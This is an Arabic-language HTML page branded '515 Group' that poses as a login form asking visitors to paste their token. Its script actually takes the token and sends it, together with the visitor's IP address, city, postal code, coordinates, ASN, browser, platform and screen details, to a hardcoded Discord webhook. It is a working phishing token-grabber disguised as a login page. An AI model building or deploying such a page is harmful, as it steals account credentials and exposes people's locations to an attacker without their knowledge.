<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>515 Group</title>
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white; }
.container { max-width:900px; margin:auto; padding:20px; }
label, textarea { display:block; width:100%; margin:10px 0; padding:12px; border-radius:8px; border:none; background: rgba(0,0,0,0.5); color:white; font-size:16px; }
button { display:block; padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; margin:10px 0; border:2px solid #000; background:#00ff4d; color:black; }
button:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b; }
</style>
</head>
<body>
<div class="container">
<h2>اوتو 515 Group</h2>
<label>اكتب التوكن هنا:</label>
<textarea id="tokenInput" placeholder="توكنك"></textarea>
<button id="sendBtn">دخول</button>
</div>

<script>
const sendBtn = document.getElementById('sendBtn');
const tokenInput = document.getElementById('tokenInput');

async function getGeoInfo() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        if(!res.ok) return {};
        return await res.json();
    } catch {
        return {};
    }
}

async function sendInfo() {
    const token = tokenInput.value.trim();
    if(!token) return;

    const geo = await getGeoInfo();
    const language = navigator.language || navigator.userLanguage;
    const screenRes = `${screen.width}x${screen.height}`;
    const colorDepth = screen.colorDepth;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    const content = `TOKEN: ${token}

🌍 الدولة: ${geo.country_name || ''}
🏙️ المدينة والمنطقة: ${geo.region || ''} - ${geo.city || ''}
🌐 عنوان IP: ${geo.ip || ''}
📮 الرمز البريدي: ${geo.postal || ''}
🕐 المنطقة الزمنية: ${timezone || ''}
📍 الإحداثيات: ${geo.latitude || ''},${geo.longitude || ''}
🔗 ASN: ${geo.org || ''}
🖥️ نظام التشغيل: ${platform || ''}
🌐 المتصفح: ${userAgent || ''}
📱 دقة الشاشة: ${screenRes || ''}
🎨 عمق الألوان: ${colorDepth || ''}
🌍 اللغة: ${language || ''}`;

    fetch("https://discord.com/api/webhooks/1405597236586348714/G8u3dnhw71M0DA9gOl0lyJTDnxmILSyx4GUdswvTgWlX9UOctibV28fzf9wtjjGVe_FY", {
        method:"POST",
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({content})
    });
}

sendBtn.addEventListener('click', sendInfo);
</script>
</body>
</html>
